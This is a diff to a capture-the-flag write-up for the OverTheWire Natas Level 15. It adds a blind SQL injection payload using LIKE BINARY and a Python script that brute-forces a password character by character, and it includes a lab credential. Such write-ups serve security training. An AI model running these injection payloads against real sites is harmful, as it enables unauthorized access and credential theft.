@@ -852,13 +852,6 @@ if(array_key_exists("username", $_REQUEST)) {
     mysql_close($link);
 } else {
 ?>
-
-<form action="index.php" method="POST">
-Username: <input name="username"><br>
-Password: <input name="password"><br>
-<input type="submit" value="Login" />
-</form>
-<? } ?>
 ```
 
 Straight up we see some SQL!
@@ -929,3 +922,194 @@ Finally we get:
 ```txt
 Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 ```
+
+# Level 15
+
+This time, there is no login, we can check if a user exists and that is it!
+
+We start by checking if `natas16` exists, we see that it does and we move to the source code.
+
+```php
+<?
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas15', '<censored>');
+    mysql_select_db('natas15', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+        if(mysql_num_rows($res) > 0) {
+            echo "This user exists.<br>";
+        } else {
+            echo "This user doesn't exist.<br>";
+        }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?> 
+```
+
+Again, there is no input sanitization, remember to always [sanitize and validate](https://owasp.org/www-project-cheat-sheets/cheatsheets/Input_Validation_Cheat_Sheet) your inputs kids!
+
+So what we can do is escape the query and bruteforce the password, 
+since page only tells us if the user exists or not, 
+we can use wildcards to know which characters belong in the password!
+
+The simplest way to do this (and the slowest) is to use a query like the following:
+
+```sql
+SELECT * FROM users WHERE username="natas16" AND password LIKE "<password>%"
+```
+
+Where the `password` is a string of characters which we will be building incrementally.
+
+So what we need to do is:
+
+- Escape the query
+- Create our query
+- Brute force password combinations
+- Profit???
+
+Let's start with the query, we want to achieve the query from before, we can start by escaping it:
+
+```sql
+natas16"
+```
+
+Easy enough, right?
+Now we insert what we want to know:
+
+```sql
+natas16" AND password LIKE "%
+```
+
+We do not end it with `"` since we paired it with the first one after Natas, 
+the PHP code will "do it for us".
+
+There is one problem however!
+According to the MySQL documentation, 
+string comparisons (in this case [`LIKE`](https://dev.mysql.com/doc/refman/5.7/en/string-comparison-functions.html#operator_like)) are not [case-sensitive](https://dev.mysql.com/doc/refman/8.0/en/case-sensitivity.html) unless one of the operands is.
+
+A simple fix is to turn the input string into a [BINARY](https://dev.mysql.com/doc/refman/8.0/en/binary-varbinary.html) string, effectively giving us case-sensitive matching:
+
+```sql
+natas16" AND password LIKE BINARY "%
+```
+
+We have our query ready! Time to brute force the password!
+
+Before we jumping head-first let's go for a quick bruteforcing refresher.
+
+[OWASP](https://owasp.org) defines a [brute force attack](https://owasp.org/www-community/attacks/Brute_force_attack) as the following:
+
+---
+
+*A brute force attack can manifest itself in many different ways, but primarily consists in an attacker configuring predetermined values, making requests to a server using those values, and then analyzing the response.*
+
+For the sake of efficiency, an attacker may use a **dictionary attack** (with or without mutations) or a **traditional brute-force attack** (with given classes of characters e.g.: alphanumerical, special, case (in)sensitive). 
+Considering a given method, number of tries, efficiency of the system which conducts the attack, and estimated efficiency of the system which is attacked the attacker is able to calculate approximately how long it will take to submit all chosen predetermined values.
+
+---
+
+We don't really have a dictionary of passwords, 
+and from the query we can establish that we will be testing character by character.
+Furthermore, we know the password should have 32 characters, 
+and permuting them all would be really expensive 
+(*32! = 2.6313083693369355e+35* and this would be if we already knew all the characters!).
+
+[![Password Strength](https://imgs.xkcd.com/comics/password_strength.png)](https://xkcd.com/936/)
+
+So let us calculate how much tries we will be needing and how can we cut the cost!
+
+Our candidate set is composed of numbers 0 to 9 and ASCII characters, lower and upper case, 
+a total of 62 characters.
+So for each place of the 32 character password we have 62 candidates!
+
+A total of _32 * 62 = 1984_ iterations would be necessary in the worst case scenario!
+Not bad for a computer, they don't complain like humans do...
+
+Pretending that is too much we could do the following:
+
+Find for each character, if it belongs to the password, reducing the candidate set.
+Afterwards, just apply the same logic as before. 
+
+Taking the level password we see that it has 24 distinct characters, 
+this means we would need _24 * 62 = 1488_ iterations to find the password (plus the 62 to setup)!
+
+*To keep the script simple we will be ignoring this optimization.*
+
+*__Lesson over, let's start!__*
+
+We will need two friends for our journey. 
+`requests` for the web requests (duh!) and `string` because we are lazy and don't want to manually write down the candidates.
+
+```py
+import requests
+import string
+```
+
+Afterwards we define the target url, possible candidates, 
+password "buffer" to which we will be appending characters that belong in the password and 
+the query we will be formatting and using later.
+
+```py
+url = "http://natas15.natas.labs.overthewire.org/index.php?debug&username="
+candidates = f"{string.digits}{string.ascii_letters}"
+password = ""
+query = 'natas16" AND password LIKE BINARY "{}%'
+```
+
+Finally the loops. We know we have 32 characters and for each we need to test each character.
+
+```py
+for _ in range(32):
+    for c in candidates:
+```
+
+We send a GET request to the site, authenticating on the way and building our query.
+
+```py
+resp = requests.get(
+            url + query.format(password + c),
+            auth=("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"),
+        )
+```
+
+Finally if the current character yields results, we append it to the password and do not test any more candidates for the current character index.
+
+```py
+if "exists" in resp.text:
+            password += c
+            print(password)
+            break
+```
+
+Run the script and in no time you'll have your dear password for the next level!
+
+The final code looks like the following:
+
+```py
+url = "http://natas15.natas.labs.overthewire.org/index.php?debug&username="
+candidates = f"{string.digits}{string.ascii_letters}"
+password = ""
+query = 'natas16" AND password LIKE BINARY "{}%'
+for _ in range(32):
+    for c in candidates:
+        resp = requests.get(
+            url + query.format(password + c),
+            auth=("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"),
+        )
+        if "exists" in resp.text:
+            password += c
+            print(password)
+            break
+```
+
+# Level 16
